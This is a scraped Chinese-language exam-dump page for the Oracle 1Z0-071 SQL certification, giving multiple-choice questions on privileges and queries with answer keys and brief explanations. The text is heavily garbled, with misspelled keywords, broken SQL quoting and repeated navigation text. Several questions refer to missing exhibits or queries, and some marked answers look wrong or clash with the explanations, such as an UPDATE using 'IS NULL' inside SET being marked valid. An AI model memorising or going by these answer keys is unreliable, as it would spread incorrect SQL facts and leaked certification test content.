I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three privileges can be restricted to a subset of columns in a table? A. SELECT B. REFERENCES C. INDEX D. ALTER E. INSERT F. DELETE G. UPDATE Correct Answer: BEG Explanation/Reference: 考点：权限问哪些权限可以授权到表中的列 QUESTION 5 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three are true about system and object privileges? A. WITH GRANT OPTION cannot be used when granting an object privilege to PUBLIC. B. Adding a foreign key constraint pointing to a table in another schema requires the REFERNCES object privilege. C. Adding a primary key constraint to an existing table in another schema requires a system privilege. D. With GRANT OPTION can be used when granting an object privilege to both users and roles. E. Revoking a system privilege that was granted with WITH ADMIN OPTION has cascading effect. F. Revoking an object privilege that was granted with the WITH GRANT OPTION clause has a cascading effect. Correct Answer: BCF Explanation/Reference: 考点：权限 A 错可以 grant 对象权限到 public B 对 grant references(列名) on 表明 to 用户； C 对 create any index 权限 D 错不能 grant 对象给 role E 错系统权限没有级联效应 F 对对象权限有级联效应 A 错D 错 QUESTION 6 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two are true about granting privileges on objects? A. An object privilege can be granted to a role only by the owner of that object. B. An object privilege can be granted to other users only by the owner of that object. C. The owner of an object acquires all object privileges on that object by default. D. A table owner must grant the REFERENCES privilege to allow other users to create FOREIGN KEY constraints using that table. E. The WITH GRANT OPTION clause can be used only by DBA users. Correct Answer: CD Explanation/Reference: A 错 only 有权限就可以 grant，sys 可以 B 错 only 权限 C 对。默认情况下，对象的所有者获得该对象上的所有对象特权 D 对 grant references on t1 to user1 E 错 only 对象权限用户可以授权 QUESTION 7 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two actions can you perform with object privileges? A. Create roles. B. Delete rows from tables in any schema except sys. C. Set default and temporary tablespaces for a user. D. Create FORETGN KEY constraints that reference tables in other schemas. E. Execute a procedure or function in another schema. Correct Answer: BD Explanation/Reference: 分析：BD A 错 role 属于 sys B 对 DML C 错 sys分配空间 D 对跨模式就是对象权限 E 错 sys存储过程 QUESTION 8 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two are true about the WITH GRANT option clause? A. The grantee can grant the object privilege to any user the database, with or without including this option. B. It can be used to pass on privileges to the users by the grantee C. The grantee must have the GRANT ANY OBJECT PRIVILEGE system privilege to use this option. D. It can be used for system and object privileges E. It can be used when granting privileges to roles. F. It cannot be used to pass on privileges to PUBLIC by the grantee. Correct Answer: BC Explanation/Reference: A 错没有 with grant option 就不能传递权限 B 正确 C 正确 D 错只能作用于对象权限 E 错不能给角色 F 错 (解析：只有对象权限授权的时候才有这个选项;实验证明有这个选项的授权者可以把该对象权限授权给所有人。) F 答案错：SQL&gt; grant select on scott.emp to public; 授权成功。 E 答案错：ORA-01926: 无法将 WITH GRANT OPTION GRANT角色 C 答案对： SQL&gt; grant GRANT ANY OBJECT PRIVILEGE to hr; 授权成功。 SQL&gt; conn hr/hr 已连接。 SQL&gt; grant select on scott.emp to sh with grant option; QUESTION 9 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 .MANAGER is an existing role with no privileges or roles. .EMP is an existing role containing the CREATE TABLE privilege. .EMPLOYEES is an existing table in the HR schema. Which two commands execute successfully? A. GRANT CREATE SEQUENCE TO manager, emp; B. GRANT SELECT, INSERT ON hr.employees TO manager WITH GRANT OPTION; C. GRANT CREATE TABLE, emp TO manager; D. GRANT CREATE TABLE, SELECT ON hr. employees TO manager; E. GRANT CREATE ANY SESSION, CREATE ANY TABLE TO manager; Correct Answer: AC Explanation/Reference: MANAGER 是角色 role 但是不包含任何权限和角色； EMP是角色role，包含 create table 的权限； employees 是一张表，那两个命令是正确的？ conn / as sysdba create role manager; create role emp; grant create table to emp; create table scott.employees as select * from scott.emp; # 测试： GRANT CREATE SEQUENCE TO manager, emp; # 成功 GRANT SELECT, INSERT ON scott.employees TO manager WITH GRANT OPTION; # 失败 GRANT CREATE TABLE, emp TO manager; # 成功 GRANT CREATE TABLE, SELECT ON scott.employees TO manager; # 失败 GRANT CREATE ANY SESSION, CREATE ANY TABLE TO manager; # 失败 WITH GRANT OPTION; 不可以授权给角色 CREATE TABLE 是系统权限，不是对象权限不能作用在表上 CREATE ANY SESSION 不存在该权限 QUESTION 10 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three actions can you perform only with system PRIVILEGES? A. Truncate a table in another schema. B. Access flat files via a database, which are stored in an operating system directory. C. Log in to a database. D. Query any table in a database. E. Use the WITH GRANT OPTION Clause. F. Execute a procedure in another schema. Correct Answer: CDF Explanation/Reference: 哪三个操作只能使用系统特权执行? A 错没有 truncate any table B 错数据泵用普通用户 C 对 create session D 对 select any table E 错 with grant option 是对象权限 F 对储存过程的执行权限 权限分为： 系统权限：获取访问数据库的权限（典型的 DBA权限；用户系统权限） 对象权限：操作数据库对象的内容 个人理解：系统权限包括了ddl和dcl语句以及所有对any的操作;对象权限包括了alter和dql和dml（一定是作用于对某个对象） 系统权限 超过100个权限可用 数据库管理员拥有高级别的系统权限用于进行下列任务：创建、删除用户；删除表；备份表 典型的DBA权限系统权限操作认证 create user 创建其他数据库用户（需要dba角色） drop user 删除一个用户 drop any table 删除任何模式下的表 backup any table 使用导出工具备份任何模式中的表 select andy table 在模式中查询表，视图或者快照 create andy table 在任何模式下可以创建表 Exam J DQL语句的使用QUESTION 1 PROMO_BEGIN_DATE is stored in the default date format, dd-mon-rr. You need to produce a report that provides the name,cost,and start date of all promos in the POST category that were launched before January 1, 2000. Which SQL statement would you use? A. SELECT promo_name, promo_cost, promo_begin_date FROM promotions WHERE promo category = &apos; post&apos; AND promo_begin_date &lt;&apos;01-01-00&apos;; B. SELECT promo_name, promo_cost, promo_begin_date FROM promotions WHERE promo cost LIKE &apos; post%&apos; AND promo_begin_date &lt; &apos;01-01-2000. C. SELECT promo name, promo_cost, promo_begin_date FROM promotions WHERE promo category LIKE &apos;p%, AND promo_begin_date &lt; &apos;1-JANUARY-00. D. SELECT promo_name, promo_cost, promo_begin_date WHERE promo-category LIKE &apos; %post%&apos; AND promo_begin_date &lt;&apos;1-JAN-00&apos;; Correct Answer: D Explanation/Reference: 考点：where子句 日期类型 dd-mon-rr WHERE promo-category LIKE &apos; %post%&apos; AND promo begin date &lt;&apos;1-JAN-00&apos;; QUESTION 2 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the structure of the SALES table. The following query is written to retrieve all those product ID s from the SALES table that have more than 55000 sold and have been ordered more than 10 times. SQL&gt; SELECT prod_id FROM sales WHERE quantity_sold &gt; 55000 AND COUNT(*)&gt;10 GROUP BY prod_id HAVING COUNT(*)&gt;10; Which statement is true regarding this SQL statement? A. It executes successfully and generates the required result. B. It produces an error because COUNT(*) should be specified in the SELECT clause also. C. It produces an error because COUNT(*) should be only in the HAVING clause and not in the WHERE clause. D. It executes successfully but produces no result because COUNT(prod_id) should be used instead of COUNT(*). Correct Answer: C Explanation/Reference: 考点：where子句 下面的查询用于检索那些售出了超过55000台,并且已被定购超过10次的所有产品ID。 SQL&gt; SELECT prod_id FROM sales WHERE quantity_sold &gt; 55000 AND COUNT(*)&gt;10 GROUP BY prod_id HAVING COUNT(*)&gt;10; where条件中使用 count(*) 错误，因此这条SQL执行失败。 关于查询语句的描述，正确的是？ A. 执行成功,并给出正确结果。 B.报错，因为COUNT(*)也应该指定到SELECT子句中。 C.报错，因为COUNT(*)只能用在HAVING子句中，不能在WHERE子句中。 D.执行成功，但是没有返回结果，因为COUNT(prod_id)应该用COUNT(*)代替。 QUESTION 3 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the structure of the ORDER_ITEMS table. Examine the following SQL statement: SELECT order_id, product_id, unit_price FROM order_items WHERE unit_price = (SELECT MAX(unit_price) FROM order items GROUP BY order_id); You want to display the PRODUCT_ID of the product that has the highest UNIT_PRICE per ORDER_ID. What correction should be made in the above SQL statement to achieve this? A. Replace = with the IN operator. B. Replace =with the &gt;ANY operator C. Replace = with the &gt;ALL operator. D. Remove the GROUP By clause from the subquery and place it in the main query. Correct Answer: A Explanation/Reference: 考点：in子句题意是希望显示每个 ORDER_ID 具有昀高 UNIT_PRICE 的产品的 PROT_ID 的信息 QUESTION 4 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the details of the ORDER_ITEMS table. Evaluate the following SQL statements: Statement 1: SELECT MAX(unit_price*quantity) &quot;Maximum Order&quot; FROM order_items; Statement 2: SELECT MAX(unit_price*quantity) &quot;Maximum Order&quot; FROM order_items GROUP BY order_id; Which statements are true regarding the output of these SQL statements? (Choose all that apply.) A. Both statements would ignore NULL values for the UNIT_PRICE and QUANTITY columns. B. Statement 1 would return only one row of output. C. Both the statements would give the same output. D. Statement 2 would return multiple rows of output. E. Statement 1 would not return any row because the GROUP BY clause is missing. Correct Answer: ABD Explanation/Reference: 考点： 对于 null 值，Oracle 计算的时候结果为空，但是在求昀大值的时候，会忽略) SQL&gt; select sal*comm from emp; SAL*COMM 480000 625000 1750000 … SQL&gt; select max(sal*comm) from emp; MAX(SAL*COMM) 1750000 QUESTION 5 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Evaluate the following query: SELECT INTERVAL &apos;300&apos; MONTH, INTERVAL &apos;54-2&apos; YEAR TO MONTH, INTERVAL &apos;11:12:10.1234567&apos; HOUR TO SECOND FROM dual; What is the correct output of the above query? A. +25-00 , +54-02, +00 11:12:10.123457 B. +00-300, +54-02, +00 11:12:10.123457 C. +25-00, +00-650, +00 11:12:10.123457 D. +00-300, +00-650, +00 11:12:10.123457 Correct Answer: A Explanation/Reference: 考点：interval INTERVAL &apos;300&apos; MONTH：300 个月为+25-00(25 年，即 25*12+0) INTERVAL &apos;54-2&apos; YEAR TO MONTH：+54-02，表示 54 年零 2 个月 INTERVAL &apos;11:12:10.1234567&apos; HOUR TO SECOND: +00 11:12:10.123457(+00 表示 0 天)，表示 11 个小时，12 分，10.123457 秒 QUESTION 6 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 which statement is true regarding the outcome of the above query? A. It executes successfully and displays rows in the descending order of PROMO CATEGORY. B. It produces an error because positional notation cannot be used in the ORDER BY dause with sEr operators. C. It executes successfully but ignores the ORDER BY dause because it is not located at the end of the compound statement. D. It produces an eror because the ORDER BY dause should appear only at the end of a compound query-that is, with the last SELECr statement. Correct Answer: D Explanation/Reference: 考点：集合它产生一个eror，因为ORDER BY dause应该只出现在复合查询的结尾—即昀后一个SELECr语句。 QUESTION 7 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the structure of the cusTOMERs table. choose the best answer: View the Exhibit and examine the structure of the CUSTOMERS table. CUSTOMER_VU is a view based on CUSTOMERS_BR1 table which has the same structure as CUSTOMERS table. CUSTOMERS needs to be updated to reflect the latest information about the customers. What is the error in the following MERGE statement? MERGE INTO customers c USING customer_vu cv ON (c.customer_id = cv.customer_id) WHEN MATCHED THEN UPDATE SET c.customer_id = cv.customer_id, c.cust_name = cv.cust_name, c.cust_email = cv.cust_email, c.income_level = cv.income_level WHEN NOT MATCHED THEN INSERT VALUES(cv.customer_id,cv.cust_name,cv.cust_email,cv.income_level) WHERE cv.income_level &gt;100000; A. The INTO clause is misplaced in the command. B. The WHERE clause cannot be used with INSERT. C. CUSTOMER_VU cannot be used as a data source. D. The CUSTOMER_ID column cannot be updated Correct Answer: D Explanation/Reference: 考点：merge QUESTION 8 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which statement is true regarding the execution of the above queries？ A. Only the first query gives the correct result. B. Only the second query gives the correct result C. Both execute successfully and give the same result. D. Both execute successfully but do not give the required result Correct Answer: A Explanation/Reference: 考点：SQL语句 QUESTION 9 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 what is the outcome? A. It generates an error because the alias is not valid B. It executes successfully and gives the correct output. C. It executes successfully but does not give the correct output D. It generates an error because the usage of the RoUND function in the expression is not valid. E. It generates an error because the concatenation operator can be used to combine only two items. Correct Answer: C Explanation/Reference: 考点：NULL 当null参加运算时为null SCOTT@testdb&gt;select ename || &apos; joined on &apos;|| hiredate || &apos; , the total paid is &apos; || to_char(round(round(sysdate-hiredate)/365 * sal + comm)) a from emp; A test1 joined on 19-JAN-20 , the total paid is 11 test joined on 19-JAN-20 , the total paid is 11 SMITH joined on 17-DEC-80 , the total paid is ALLEN joined on 20-FEB-81 , the total paid is 62608 WARD joined on 22-FEB-81 , the total paid is 49171 JONES joined on 02-APR-81 , the total paid is MARTIN joined on 28-SEP-81 , the total paid is 49325 BLAKE joined on 01-MAY-81 , the total paid is CLARK joined on 09-JUN-81 , the total paid is SCOTT joined on 19-APR-87 , the total paid is KING joined on 17-NOV-81 , the total paid is TURNER joined on 08-SEP-81 , the total paid is 57592 ADAMS joined on 23-MAY-87 , the total paid is JAMES joined on 03-DEC-81 , the total paid is FORD joined on 03-DEC-81 , the total paid is MILLER joined on 23-JAN-82 , the total paid is booboo joined on 19-JAN-20 , the total paid is 1010 没有年终奖comm的员工没有工资了，因此执行成功，结果是错的，正确的SQL为： select ename || &apos; joined on &apos;|| hiredate || &apos; , the total paid is &apos; || to_char(round(round(sysdate-hiredate)/365 * sal + nvl(comm,0))) a from emp; SCOTT@testdb&gt;select ename || &apos; joined on &apos;|| hiredate || &apos; , the total paid is &apos; || to_char(round(round(sysdate-hiredate)/365 * sal + nvl(comm,0))) a from emp; A test1 joined on 19-JAN-20 , the total paid is 11 test joined on 19-JAN-20 , the total paid is 11 SMITH joined on 17-DEC-80 , the total paid is 31296 ALLEN joined on 20-FEB-81 , the total paid is 62608 WARD joined on 22-FEB-81 , the total paid is 49171 JONES joined on 02-APR-81 , the total paid is 115520 MARTIN joined on 28-SEP-81 , the total paid is 49325 BLAKE joined on 01-MAY-81 , the total paid is 110439 CLARK joined on 09-JUN-81 , the total paid is 94677 SCOTT joined on 19-APR-87 , the total paid is 98342 KING joined on 17-NOV-81 , the total paid is 191014 TURNER joined on 08-SEP-81 , the total paid is 57592 ADAMS joined on 23-MAY-87 , the total paid is 35956 JAMES joined on 03-DEC-81 , the total paid is 36251 FORD joined on 03-DEC-81 , the total paid is 114477 MILLER joined on 23-JAN-82 , the total paid is 49425 booboo joined on 19-JAN-20 , the total paid is 1010 17 rows selected. QUESTION 10 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the SOL statement: SQL&gt; SELECT * FROM books_transactions WHERE borrowed_date&lt;SYSDATE AND transaction_ type=&apos; RM&quot; OR MEMBE_ID IN (&apos;A101&apos;, &apos;A1021); Which statement is true about the outcome? A. It displays details only for members who have borrowed before today with RM as TRANSACTION TYPE. B. It displays details for only members A101 and A102 who have borrowed before today with RM as TRANSACTION TYPE. C. It displays details for members who have borrowed before today with RM as TRANBACTION TYPE and the details for members A101 or A102. D. It displays details for members who have borrowed before today&apos;s date with either RM as TRANSACTION TYPE Or MEMBER ID as A101 and A102. Correct Answer: C Explanation/Reference: 考点：where子句 either 或者，两者择一 D 今天之前或者rm作为类型错误，可以排除 C 类型RM且今天之前购买和号码为 101或102 的情况。 QUESTION 11 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true regarding operators used with subqueries?(Choose two.) A. The NOT IN operator is equivalent to IS NULL. B. The &lt;ANY operator means less than the maximum. C. =ANY and =ALL operators have the same functionality. D. The IN operator cannot be used in singlerow subqueries. E. The NOT operator can be used with IN, ANY and ALL operators. Correct Answer: BE Explanation/Reference: 考点：操作符 关于子查询使用的操作符，哪两个陈述是正确的? A 错 not in 和 is null 没有任何关系 B 对小于 any 等于比昀大的小 C 错 ANY和 ALL功能不同D 错 in 操作可以用在单行子查询中 E 对 not 可以用于 in ，any，all QUESTION 12 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which statement accomplishes all the required tasks? A. SELECT cust_first_name, cust_credit_limit * 0.05 AS TAX AMOUNT FROM customers WHERE cust income level Is INOT NULL AND tax amount IS NOT NULL: B. SELECT cust_first_name, cust_credit_limit * 0.05 As TAX AMOUNT FROM customers WHERE cus_income_level IS NOT NULL AND cust_credit_limit Is NOT NUIL: C. SELECT cust_first_name, cust_credit_limit * 0.05 AS TAX AMOUNT FROM customers WHERE cus_income_level &gt; NULL AND tax ax amount &lt;&gt; NULL; D. SELECTcust_first_name, cust_credit_limit * 0.05 AS TAX AMOUNT FROM customers WHERE (cust income level, tax amoune) IS NOT NULL: Correct Answer: B Explanation/Reference: 考点：SQL语句 要求 1. cust_first_name, cust_credit_limit * 0.05 2. cus_income_level is not null 3. cust_credit_limit is not null A 错列名不对 B 对 C 错 D 错 QUESTION 13 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You need to produce a report where each customer&apos;s credit limit has been incremented by s1000. In the output, the customer&apos;s last name should have heading Name and the incremented credit limit should be labeled New Credit Limit. The column headings should have only the fis letter of each word in uppercase. Which statement would accomplish this requirement? A. SELECT cust_last_name Name, cust_credit_limit + 1000 &quot;New credit Limit&quot; FROM customers; B. SELECT cust_last_name AS Name, cust_credit_limit + 1000 AsNew Credit Limit FROM customers; C. SELECT cust_last_name As &quot;Name&quot;, cust_credit_limit + 1000 As &quot;New Credit Limit&quot; FROM customers; D. SELECT INITCAP(cust last name) &quot;Name&quot;, cust_credit_limit + 1000 INITCAP (&quot;NEW CREDIT LIMIT&quot;) FROM customers; Correct Answer: C Explanation/Reference: 考点：列的别名 B 错 &quot;New Credit Limit&quot; 要加引号 C 对 D 错 INITCAP (&quot;NEW CREDIT LIMIT&quot;) 不能出现在列的别名中 QUESTION 14 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the structure of the ORDERs table. Which UPDATE statement is valid? A. UPDATE orders SET order_date =&quot;12-mar-2007., order_total Is NULL WHERE order id= 2455: B. UPDATE orders SET order date= &apos;12-mar-2007, order_total= NULL WHERE order_id= 2455; C. UPDATE orders SET order date= &apos;12-mar-2007, AND order total = TO NUMBER (NULL) WHERE order_id= 2455; D. UPDATE orders SET order_date=To DATE (&apos;12-mar-2007,, &quot;dd-mon-yyyy&quot;). SET order total To NUMBER (NULL) WHERE order_id 2455; Correct Answer: A Explanation/Reference: 考点：NULL is null is not null QUESTION 15 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the description of the EMPLOYEEs table You want to calculate the total remuneration for each employee. Total remuneration is the surm of the annual salary and the percentage commissio eamed for a year. Only a few employees eam commission. Which SQL statement would you execute to get the desired output? A. SELECT first name, salary, salary*12+salary* commission_pct &quot;Total&quot;. FROM EMPLOXEES: B. SELECT first nane, salary, (salary + NVL (commission pct,0)* salary) *12 &quot;rotal&quot; FROM EMPLOYEES C. SELECT first name, salary, salary*12 + NVL(salary, 0)* commission pct &quot;Total&quot; EROM EMPLOYEES; D. SELECT first name, salary, salary*12+ (salary*nvl2 (commission_pct, salary,salary+commission pct))&quot;tota1&quot; EROM EMPLOYEES Correct Answer: B Explanation/Reference: 考点：SQL语句 您需要计算每个员工的总薪酬，报酬总额是一年的工资和佣金的总和。只有几个员工有她们的佣金。 总薪酬=工资 +佣金 = salary * 12 + salary * 12 * nvl(commission_pct,0) A 错，salary*12+salary* commission_pct 当commission_pct为null时，结果为空 B正确 (salary + NVL (commission pct,0)* salary) *12 C 错 salary*12 + NVL(salary, 0)* commission pct &quot;Total&quot; 1) nvl函数的对象不应该时salary，而是commission_pct 2) 没有将佣金*12 D 错 salary*12+ (salary*nvl2 (commission_pct,salary,salary+commission pct)) QUESTION 16 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about the ORDER By clause when used with a SQL statement containing a SET operator such as UNION? A. Only column names from the first SELECT statement in the compound query are recognized. B. Each SELECT statement in the compound query can have its own ORDER BY clause. C. The first column in the first SELECT of the compound query with the UNION operator is used by default to sort output in the absence of an ORDER BY clause. D. Each SELECT statement in the compound query must have its own ORDER BY clause. E. Column positions must be used in the ORDER BY clause. Correct Answer: AC Explanation/Reference: 考点：集合 A 对只显示第一个 select 的列名，同类型合并 B 错每个 select可以有自己的排序，错误，不能有 C 对默认会以第一条 sql的第一个列进行排序 QUESTION 17 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the CUSTOMERS table: You need to display last names and credit limits of all customers whose last name starts with A or B in lower or upper case, and whose credit limit is below 1000. Examine this partial query: SELECT cust_last_name, cust_credit_limit FROM customers Which two WHERE conditions give the required result? A. WHERE (UPPER (cust_last_name) LIKE INITCAP (‘A’) OR UPPER (cust_last_name) LIKE INITCAP (‘B’)) AND ROUND (cust_credit_limit) &lt; ROUND (1000); B. WHERE (UPPER (cust_last_name) LIKE ‘A’% OR UPPER (cust_last_name) LIKE ‘B%’) AND ROUND (cust_credit_limit) &lt; 1000; C. WHERE UPPER (cust_last_name) IN (&apos;A%&apos;,&apos;B%’) AND cust_credit_limit &lt; 1000; D. WHERE (INITCAP (cust_last_name) LIKE ‘A’% OR INITCAP (cust_last_name) LIKE ‘B%’) AND cust_credit_limit &lt; 1000; E. WHERE UPPER (cust_last_name) BETWEEN UPPER (&apos;A%&apos; and &apos;B%’) AND ROUND (cust_credit_limit) &lt; 1000; Correct Answer: BD Explanation/Reference: 考点：where子句 cust_last_name 以 A/a 或 B/b 开头 cust_credit_limit &lt; 1000 A 错 like 用法错误 B 对 C 错 in 中没有like 的用法 D 对 initcap 首字母大写 E 错 between 中没有like的用法 QUESTION 18 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 which statements is true about the INTERSECT operator used in compound queries? A. It processes NULLs in the selected columns. B. INTERSECT is of lower precedence than UNION or UNION ALL. C. It ignores NULLs. D. Multiple INTERSECT operators are not possible in the same SQL statement. Correct Answer: A Explanation/Reference: 考点：集合 INTERSECT并集 A 对它处理选定列中的空值。 B 错 INTERSECT的优先级与UNION或UNION ALL一样。 C 错它忽略 null D 错在同一 SQL语句可以有多个INTERSECT运算符。 QUESTION 19 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 which two are true about the MERGE statement? A. The WHEN NOT MATCHED clause can be used to specify the updates to be performed. B. The WHEN NOT MATCHED clause can be used to specify the inserts to be performed. C. The WHEN MATCHED clause can be used to specify the inserts to be performed. D. The WHEN NOT MATCHED clause can be used to specify the deletions to be performed. E. The WHEN MATCHED clause can be used to specify the updates to be performed. Correct Answer: BE Explanation/Reference: 考点： MERGE https://docs.oracle.com/en/database/oracle/oracle-database/12.2/sqlrf/MERGE.html#GUID-5692CCB7-24D9-4C0E-81A7-A22436DC968F matched--&gt; 目标表中的主键值在数据源中被找到的则 update not matched --&gt; 数据源中主键在目标表中不存在的则 insert QUESTION 20 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 which two statements are true about the ORDER BY clause? A. NULLS are not included in the sort operation. B. Numeric values are displayed in descending order if they have deimal positions. C. In a character sort,the values are case-sensitive. D. Only columns that are specified in the SELECT list can be used in the ORDER BY clause. E. Column alias can be used in the ORDER BY clause. Correct Answer: CE Explanation/Reference: 考点: order by 分析 CE A 错排序包含空值，空值认为是无限大 B 错数字升序 C 对按照 ACEII 在字符排序中，值是区分大小写的。 D 错 only，order by 列不需要是 select 列 E 对 select 用来列别名 as，order by 可以传参。 QUESTION 21 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which is the default column or columns for sorting output from compound queries using SET operators such as INTERSECT in a SQL statement? A. the first column in the last SELECT of the compound query B. the first NUMBER column in the first SELECT of the compound query C. the first VARCHAR2 column in the first SELECT of the compound query D. the first column in the first SELECT of the compound query E. the first NUMBER or VARCHAR2 column in the last SELECT of the compound query Correct Answer: D Explanation/Reference: 考点：集合 INTERSECT交集 分析：D D 对排序：复合查询的第一列 使用SET对复合查询的输出进行排序的默认列是哪一列 QUESTION 22 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 